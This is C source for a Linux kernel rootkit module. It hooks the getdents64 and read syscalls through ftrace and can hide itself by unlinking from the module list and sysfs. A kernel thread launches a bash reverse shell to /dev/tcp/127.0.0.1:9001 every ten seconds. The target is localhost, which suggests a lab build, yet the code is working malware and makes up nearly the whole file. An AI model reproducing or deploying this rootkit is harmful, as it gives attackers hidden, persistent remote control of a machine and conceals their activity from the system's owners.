
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kobject.h>

#include "utils/ftrace_utils.h"
#include "hooks/x64_sys_getdents64.h"
#include "hooks/x64_sys_read.h"


#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched/signal.h>


static struct task_struct *task;

int exec_thread(void *data) {
    while (!kthread_should_stop()) {
        char *argv[] = { "/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/9001 0>&1", NULL };
        static char *envp[] = {
            "HOME=/",
            "TERM=linux",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
        };

        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

        ssleep(10);
    }

    return 0;
}


// define which functions to hook
static struct ftrace_hook hooks[] = {
        HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
        HOOK("__x64_sys_read", hook_read, &orig_read),
};

static int __init rootkit_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }

#ifdef HIDE_MODULE
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
#endif


    task = kthread_run(exec_thread, NULL, "exec_thread");
    if (IS_ERR(task)) {
        return PTR_ERR(task);
    }

    return 0;
}


// cleanup: restore original syscall pointer
static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
